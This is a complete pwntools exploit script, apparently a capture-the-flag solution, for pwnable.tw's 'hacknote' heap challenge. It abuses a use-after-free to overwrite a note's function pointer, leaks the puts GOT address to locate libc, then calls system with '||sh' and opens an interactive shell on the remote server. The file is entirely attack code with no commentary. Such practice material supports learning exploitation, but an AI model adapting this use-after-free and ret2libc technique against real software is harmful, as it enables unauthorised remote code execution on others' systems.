from pwn import *


io = remote('chall.pwnable.tw', 10102)
libc = ELF('./libc_32.so.6')

#io = process('./hacknote')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
elf = ELF('./hacknote')

def add(size, content):
	print(io.recvuntil(':'))
	io.sendline('1')
	print(io.recvuntil('Note size :'))
	io.sendline(str(size))
	print(io.recvuntil('Content :'))
	io.send(content)

def delete(index):
	print(io.recvuntil(':'))
	io.sendline('2')
	print(io.recvuntil('Index :'))
	io.sendline(str(index))

def printf(index):
	print(io.recvuntil(':'))
	io.sendline('3')
	print(io.recvuntil('Index :'))
	io.sendline(str(index))

add(20, b'\n')
add(20, b'\n')
delete(0)
delete(1)
add(8, p32(0x804862b)+p32(elf.got['puts']))
printf(0)
libc.address = u32(io.recv(4))-libc.sym['puts']
delete(1)
add(8, p32(libc.sym['system'])+b'||sh')
printf(0)
io.interactive()
